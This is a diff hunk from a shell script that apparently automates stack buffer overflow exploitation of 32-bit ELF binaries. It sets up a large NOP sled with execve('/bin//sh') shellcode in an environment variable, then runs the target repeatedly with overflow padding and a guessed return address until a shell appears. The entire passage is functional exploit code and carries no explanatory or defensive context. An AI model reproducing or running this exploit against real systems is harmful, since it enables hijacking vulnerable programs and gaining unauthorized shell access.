@@ -49,8 +49,8 @@ then
 			export SHELLCODE=$(for i in {1..99999}; do echo -ne '\x90';done)$(echo -ne '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')
 		fi
 		echo 'EXPLOITING...'
-		$FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyy')$(echo -n 'zzzz')$(echo -n 'yyyy')$(echo -ne '\x80\x80\xff\xff')
-		$FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyy')$(echo -n 'zzzz')$(echo -n 'yyyy')
+		$FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyyyyyy')$(echo -n 'zzzz')
+		while true ; do $FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyy')$(echo -n 'zzzz')$(echo -n 'yyyy')$(echo -ne '\x80\x80\xff\xff') ; done
 		echo 'IF NO SHELL - RETRY OR INCREASE NOPSLED'
 	else
 		echo 'ELF IS 64-BIT'
